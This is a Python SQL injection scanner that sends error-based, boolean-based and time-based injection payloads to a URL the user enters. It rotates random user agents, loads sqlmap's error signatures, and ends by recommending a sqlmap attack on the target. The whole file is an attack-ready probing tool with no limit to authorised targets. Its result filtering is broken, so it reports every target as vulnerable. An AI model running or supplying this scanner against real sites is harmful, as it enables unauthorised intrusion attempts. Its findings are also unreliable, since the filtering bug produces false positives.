import requests
import time
import random
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET

# Class to store sqli injection logic
class SQLIDetection:
    # initalises the variable
    def __init__(self, target_url, payloads, errors):
        self.target_url = target_url # Stores the target url
        self.payloads = payloads # Stores the payloads
        self.errors_sigatures = errors # Stores the errors
        self.session = requests.Session() # Creates a new user session
        self.baseline_content = self.session.get(target_url).content # Set a baseline to compare against

    # Function to check error based injection
    def check_error_based(self):
        # Outputs there is a check for the error based sql injection
        print("[*] Testing for Error-based SQLi...")

        # Loops over the payloads
        for payload in self.payloads["error"]:
            try:
                # Gets the response from the page with the payload
                response = self.session.get(self.target_url + payload, headers=get_random_agent(), timeout=10)
                # Loops over the signatures in the errors list
                for signature in self.errors_sigatures:
                    # Checks if the signature is in the response text
                    if re.search(signature, response.text, re.IGNORECASE):
                        return f"[!] VULNERABLE: Error-based found with payload: {payload} (Matched: {signature})"
            except: continue
    
        # Returns none if nothing was found
        return None
    
    # Checks for boolean based injection
    def check_boolean_based(self):
        # Outputs testing for boolean based sqli
        print("[*] Testing for Boolean-based SQLi...")
        # Loops over the payloads in the boolean payloads
        for payload in self.payloads["boolean"]:
            try:
                # Stores the true and false response
                res_true = self.session.get(self.target_url + payload["true"], headers=get_random_agent())
                res_false = self.session.get(self.target_url + payload["false"], headers=get_random_agent())
                
                # If the "True" payload matches the baseline but "False" doesn't, it's vulnerable
                if len(res_true.content) != len(res_false.content):
                    # Checks if the content is the same
                    if len(res_true.content) == len(self.baseline_content):
                        # Returns the payload which was found
                        return f"[!] VULNERABLE: Boolean-based found with {payload['true']}"
            except: continue # Continues to the next iternation
        # Returns false
        return None

    # Checks for time based sql injection
    def check_time_based(self):
        # Outputs checks for time based sqli
        print("[*] Testing for Time-based SQLi (this may take a moment)...")
        
        # Loops over the payloads in the time payloads
        for payload in self.payloads["time"]:
            try:
                # Records the starting time
                start = time.time()
                # Sends the request
                self.session.get(self.target_url + payload, headers=get_random_agent(), timeout=15)
                # Calculates the duration
                duration = time.time() - start
                # Checks the duaration is more than five secomds
                if duration >= 5:
                    # Returns which payload triggered
                    return f"[!] VULNERABLE: Time-based found with payload: {payload}"
            except requests.exceptions.Timeout:
                return f"[!] VULNERABLE: Time-based (Timeout triggered) with payload: {payload}"
        # Returns none
        return None
    
    # Function to run a program
    def run(self):
        # Stores the results from each of the methods
        results = [
            self.check_error_based(),
            self.check_boolean_based(),
            self.check_time_based()
        ]
        
        # Creates a list of the found results using list comphrehention
        found = [result for result in results if results]
        # Checks if there is anything found
        if found:
            # Loops over the entrys in found and prints them
            for f in found: print(f)
            print("\n[+] Recommendation: Proceed with sqlmap -u " + self.target_url)
        else:
            # Prints no obivous vulnerabilites found
            print("[-] No obvious vulnerabilities detected.")

# Function to get random user agent from folder
def get_random_agent():
    # Opens the file
    with open("../../Resources/user_agent_strings.txt", "r") as f:
        # Extracts the user agents as a list
        user_agents = [user_agent.strip() for user_agent in f if user_agent.strip()]

    # Selects a random index
    user_agent = random.choice(user_agents)

    # Returns the headers
    return {"User-Agent": user_agent}

def get_errors_messages():
    # Stores the error to be returned
    error_list = []
    
    # SQL Errors file
    # Note: Using the raw URL so requests grabs the XML data, not the GitHub webpage HTML
    error_file = "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/errors.xml"

    # Gets the errors from the error file
    errors = requests.get(error_file)

    # Creates the element tree object
    root = ET.fromstring(errors.content)

    # Loops over the tree root for dbms items
    for item in root.findall("dbms"):
        # Loops over the child elements
        for child in item:
            # Adds the error pattern to the arrary which stores them
            error_list.append(child.get('regexp'))

    # Returns the errors message
    return error_list

def main():
    # Payloads for initial detection
    payloads = {
        "error": ["'", "''", "\"", "`", "')"],
        "boolean": [
            {"true": " AND 1=1", "false": " AND 1=2"},
            {"true": "' OR '1'='1", "false": "' OR '1'='2"}
        ],
        "time": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "') OR pg_sleep(5)--"]
    }

    # Gets the error messages
    errors = get_errors_messages()

    # Allows the user to enter in a url to scan
    url = input("Enter URL to scan (e.g., http://testphp.vulnweb.com/listproducts.php?cat=1): ").strip().lower()
    
    # CHecks if the url starts with http
    if not url.startswith("http"):
        # Outputs it is an invaild url
        print("[!] Invalid URL.")
        return
    
    # Creates and runs the scanner
    scanner = SQLIDetection(url, payloads, errors)
    scanner.run()

# Starts the program
if __name__ == "__main__":
    main()